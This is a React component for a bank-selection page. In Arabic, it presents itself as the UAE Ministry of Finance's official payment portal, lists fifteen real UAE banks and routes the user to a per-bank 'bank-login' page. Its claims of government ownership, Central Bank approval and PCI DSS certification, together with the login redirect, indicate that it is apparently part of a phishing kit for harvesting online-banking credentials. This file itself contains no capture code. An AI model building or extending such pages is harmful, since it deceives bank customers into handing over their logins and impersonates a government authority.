import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Lock as LockIcon, Shield, Building2, ArrowLeft, CheckCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

// UAE Government Official Color Scheme
const uaeColors = {
  primary: "#CE1126", // UAE Red (Official)
  secondary: "#00732F", // UAE Green (Official)
  accent: "#000000", // Black (Official)
  background: "#FFFFFF", // White (Official)
  lightGray: "#F5F5F5", // Light Gray
  border: "#E0E0E0", // Border
  gold: "#b68a35", // MOF Gold (Official)
  goldHover: "#8f6c29", // MOF Gold Hover
};

// UAE Banks Data
const uaeBanks = [
  { id: 'adib', name: 'مصرف أبوظبي الإسلامي', nameEn: 'ADIB', logo: '/images/banks/adib-logo.png' },
  { id: 'ajman_bank', name: 'مصرف عجمان', nameEn: 'Ajman Bank', logo: '/images/banks/ajman-bank-logo.png' },
  { id: 'dubai_islamic', name: 'بنك دبي الإسلامي', nameEn: 'Dubai Islamic Bank', logo: '/images/banks/dib-logo.png' },
  { id: 'mashreq', name: 'بنك المشرق', nameEn: 'Mashreq Bank', logo: '/images/banks/mashreq-logo.png' },
  { id: 'sharjah_islamic', name: 'مصرف الشارقة الإسلامي', nameEn: 'Sharjah Islamic Bank', logo: '/images/banks/sib-logo.png' },
  { id: 'fab', name: 'بنك أبوظبي الأول', nameEn: 'FAB Bank', logo: '/images/banks/fab-logo.png' },
  { id: 'hsbc', name: 'بنك HSBC', nameEn: 'HSBC Bank', logo: '/images/banks/hsbc-logo.png' },
  { id: 'adcb', name: 'بنك أبوظبي التجاري', nameEn: 'ADCB Bank', logo: '/images/banks/adcb-logo.png' },
  { id: 'rakbank', name: 'بنك رأس الخيمة الوطني', nameEn: 'RAKBANK', logo: '/images/banks/rakbank-logo.png' },
  { id: 'cbi', name: 'البنك التجاري الدولي', nameEn: 'CBI Bank', logo: '/images/banks/cbi-logo.png' },
  { id: 'nbf', name: 'بنك الفجيرة الوطني', nameEn: 'NBF Bank', logo: '/images/banks/nbf-logo.png' },
  { id: 'emirates_islamic', name: 'الإمارات الإسلامي', nameEn: 'Emirates Islamic Bank', logo: '/images/banks/eib-logo.png' },
  { id: 'nbd', name: 'بنك الإمارات دبي الوطني', nameEn: 'NBD Bank', logo: '/images/banks/nbd-logo.png' },
  { id: 'cbd', name: 'بنك دبي التجاري', nameEn: 'Commercial Bank of Dubai', logo: '/images/banks/cbd-logo.png' },
  { id: 'liv', name: 'بنك LIV', nameEn: 'LIV Bank', logo: '/images/banks/liv-logo.png' },
];

const PaymentUaeBankSelector = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [selectedBank, setSelectedBank] = useState<string>("");

  const handleContinue = async () => {
    if (!selectedBank) {
      toast({
        title: "لم يتم اختيار بنك",
        description: "الرجاء اختيار البنك للمتابعة",
        variant: "destructive",
      });
      return;
    }

    // Store selected bank
    sessionStorage.setItem('selectedBank', selectedBank);
    sessionStorage.setItem('selectedCountry', 'AE');

    // Navigate to bank login page
    navigate(`/pay/uae/bank-login/${selectedBank}`);

    toast({
      title: "تم اختيار البنك",
      description: "سيتم توجيهك الآن لصفحة تسجيل الدخول",
    });
  };

  const selectedBankData = uaeBanks.find(bank => bank.id === selectedBank);

  return (
    <div className="min-h-screen" style={{ backgroundColor: uaeColors.background }} dir="rtl">
      {/* Official UAE Government Header */}
      <div
        className="w-full border-b-4"
        style={{
          backgroundColor: uaeColors.background,
          borderBottomColor: uaeColors.primary
        }}
      >
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              {/* UAE Official Government Logo */}
              <div className="w-20 h-20 flex items-center justify-center">
                <svg width="80" height="80" viewBox="0 0 100 100" className="fill-current" style={{ color: uaeColors.primary }}>
                  <circle cx="50" cy="50" r="45" fill="white" stroke={uaeColors.primary} strokeWidth="3" />
                  <text x="50" y="45" textAnchor="middle" fontSize="18" fontWeight="bold" fill={uaeColors.primary} fontFamily="Noto Kufi Arabic">الإمارات</text>
                  <text x="50" y="60" textAnchor="middle" fontSize="14" fontWeight="bold" fill={uaeColors.secondary} fontFamily="Noto Kufi Arabic">UAE</text>
                </svg>
              </div>
              <div>
                <h1 className="text-2xl font-bold" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  البوابة الإلكترونية الموحدة للسداد
                </h1>
                <p className="text-sm" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  وزارة المالية - حكومة دولة الإمارات العربية المتحدة
                </p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <Badge variant="secondary" className="bg-white border-2" style={{ borderColor: uaeColors.gold, color: uaeColors.gold }}>
                <LockIcon className="w-4 h-4 ml-1" />
                <span style={{ fontFamily: 'Noto Kufi Arabic, sans-serif' }}>اتصال آمن ومشفر</span>
              </Badge>
            </div>
          </div>
        </div>
      </div>

      {/* Navigation Bar */}
      <div className="w-full" style={{ backgroundColor: uaeColors.lightGray }}>
        <div className="container mx-auto px-4 py-2">
          <div className="flex items-center gap-6">
            <a href="/pay/uae" className="text-sm font-semibold hover:underline" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
              ← العودة
            </a>
            <a href="#" className="text-sm" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
              الخدمات الإلكترونية
            </a>
            <a href="#" className="text-sm" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
              حول دولة الإمارات
            </a>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-5xl mx-auto">
          {/* Official Header Banner */}
          <div className="mb-6 p-6 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
            <div className="flex items-center gap-4">
              <div
                className="w-20 h-20 rounded-full flex items-center justify-center"
                style={{ backgroundColor: uaeColors.secondary }}
              >
                <svg width="60" height="60" viewBox="0 0 100 100" className="text-white">
                  <text x="50" y="40" textAnchor="middle" fontSize="24" fontWeight="bold" fill="white" fontFamily="Noto Kufi Arabic">ع</text>
                  <text x="50" y="65" textAnchor="middle" fontSize="18" fill="white" fontFamily="Noto Kufi Arabic">دولة الإمارات</text>
                </svg>
              </div>
              <div>
                <h2 className="text-3xl font-bold mb-2" style={{ color: uaeColors.primary, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  الخدمات المصرفية الإلكترونية
                </h2>
                <p className="text-lg" style={{ color: uaeColors.secondary, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  الرجاء اختيار البنك الخاص بك للمتابعة
                </p>
              </div>
            </div>
          </div>

          {/* Main Content */}
          <div className="bg-white rounded-lg shadow-xl border-2 overflow-hidden" style={{ borderColor: uaeColors.gold }}>
            {/* Official Government Header */}
            <div
              className="p-8 border-b-2 text-center"
              style={{
                background: `linear-gradient(135deg, ${uaeColors.primary}, ${uaeColors.secondary})`
              }}
            >
              <div className="flex items-center justify-center mb-4">
                <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center">
                  <Building2 className="w-10 h-10" style={{ color: uaeColors.primary }} />
                </div>
              </div>
              <h3 className="text-2xl font-bold text-white mb-2" style={{ fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                اختر البنك الذي تريد التحويل إليه
              </h3>
              <p className="text-white opacity-90" style={{ fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                جميع البنوك المدعومة حاصلة على ترخيص المصرف المركزي الإمارات
              </p>
            </div>

            {/* Banks List */}
            <div className="p-8">
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-8">
                {uaeBanks.map((bank) => (
                  <div
                    key={bank.id}
                    onClick={() => setSelectedBank(bank.id)}
                    className={`p-6 rounded-lg border-2 cursor-pointer transition-all hover:shadow-xl hover:scale-105 ${
                      selectedBank === bank.id
                        ? 'border-opacity-100'
                        : 'border-opacity-50 hover:border-opacity-75'
                    }`}
                    style={{
                      borderColor: selectedBank === bank.id ? uaeColors.gold : uaeColors.border,
                      backgroundColor: selectedBank === bank.id ? `${uaeColors.gold}08` : uaeColors.background,
                    }}
                  >
                    <div className="text-center">
                      {/* Bank Logo */}
                      <div
                        className="w-20 h-20 mx-auto rounded-full flex items-center justify-center mb-4"
                        style={{ backgroundColor: selectedBank === bank.id ? uaeColors.gold : uaeColors.lightGray }}
                      >
                        <Building2
                          className="w-10 h-10"
                          style={{ color: selectedBank === bank.id ? 'white' : uaeColors.primary }}
                        />
                      </div>
                      <h4
                        className="font-bold text-lg mb-2"
                        style={{
                          color: uaeColors.accent,
                          fontFamily: 'Noto Kufi Arabic, sans-serif'
                        }}
                      >
                        {bank.name}
                      </h4>
                      <p className="text-sm mb-4" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                        {bank.nameEn}
                      </p>
                      {selectedBank === bank.id && (
                        <div
                          className="w-8 h-8 rounded-full flex items-center justify-center mx-auto"
                          style={{ backgroundColor: uaeColors.secondary }}
                        >
                          <CheckCircle className="w-5 h-5 text-white" />
                        </div>
                      )}
                    </div>
                  </div>
                ))}
              </div>

              {/* Security Notice */}
              <div
                className="rounded-lg p-6 border-2 mb-6"
                style={{ backgroundColor: `${uaeColors.secondary}08`, borderColor: uaeColors.secondary }}
              >
                <div className="flex items-start gap-4">
                  <div
                    className="w-12 h-12 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: uaeColors.secondary }}
                  >
                    <Shield className="w-6 h-6 text-white" />
                  </div>
                  <div className="flex-1">
                    <h4 className="text-lg font-bold mb-2" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                      دفع آمن ومشفر 256-bit SSL
                    </h4>
                    <p className="text-sm mb-2" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                      جميع المعاملات محمية بأعلى معايير الأمان العالمية
                    </p>
                    <div className="flex items-center gap-4 text-xs" style={{ color: uaeColors.gold }}>
                      <span>✓ معتمد من المصرف المركزي الإمارات</span>
                      <span>✓ مشفر بتقنية TLS 1.3</span>
                      <span>✓ متوافق مع PCI DSS</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Selected Bank Info */}
              {selectedBankData && (
                <div
                  className="rounded-lg p-6 mb-6 border-2"
                  style={{ backgroundColor: `${uaeColors.gold}08`, borderColor: uaeColors.gold }}
                >
                  <div className="flex items-center gap-4">
                    <div
                      className="w-16 h-16 rounded-full flex items-center justify-center"
                      style={{ backgroundColor: uaeColors.gold }}
                    >
                      <Building2 className="w-8 h-8 text-white" />
                    </div>
                    <div>
                      <p className="text-sm" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>البنك المختار:</p>
                      <p className="text-xl font-bold" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                        {selectedBankData.name}
                      </p>
                      <p className="text-sm" style={{ color: uaeColors.secondary, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                        {selectedBankData.nameEn}
                      </p>
                    </div>
                  </div>
                </div>
              )}

              {/* Submit Button */}
              <Button
                onClick={handleContinue}
                className="w-full h-16 text-xl font-bold text-white transition-all hover:shadow-lg"
                style={{
                  backgroundColor: uaeColors.gold,
                  fontFamily: 'Noto Kufi Arabic, sans-serif'
                }}
                disabled={!selectedBank}
              >
                <span className="ml-2">متابعة للدفع</span>
                <ArrowLeft className="w-6 h-6" />
              </Button>
            </div>
          </div>

          {/* Official Government Footer */}
          <div className="mt-8 p-6 rounded-lg text-center" style={{ backgroundColor: uaeColors.lightGray }}>
            <div className="flex items-center justify-center gap-6 mb-4">
              <div className="text-center">
                <div className="w-16 h-16 mx-auto mb-2 rounded-full flex items-center justify-center" style={{ backgroundColor: uaeColors.primary }}>
                  <Shield className="w-8 h-8 text-white" />
                </div>
                <p className="text-xs font-semibold" style={{ color: uaeColors.primary, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  المصرف المركزي الإمارات
                </p>
              </div>
              <div className="text-center">
                <div className="w-16 h-16 mx-auto mb-2 rounded-full flex items-center justify-center" style={{ backgroundColor: uaeColors.gold }}>
                  <LockIcon className="w-8 h-8 text-white" />
                </div>
                <p className="text-xs font-semibold" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  PCI DSS Certified
                </p>
              </div>
              <div className="text-center">
                <div className="w-16 h-16 mx-auto mb-2 rounded-full flex items-center justify-center" style={{ backgroundColor: uaeColors.secondary }}>
                  <Building2 className="w-8 h-8 text-white" />
                </div>
                <p className="text-xs font-semibold" style={{ color: uaeColors.secondary, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
                  وزارة المالية
                </p>
              </div>
            </div>
            <p className="text-sm font-semibold" style={{ color: uaeColors.accent, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
              جميع الحقوق محفوظة © 2025 حكومة دولة الإمارات العربية المتحدة
            </p>
            <p className="text-xs mt-2" style={{ color: uaeColors.gold, fontFamily: 'Noto Kufi Arabic, sans-serif' }}>
              البوابة الإلكترونية الموحدة للخدمات الحكومية - وزارة المالية
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentUaeBankSelector;
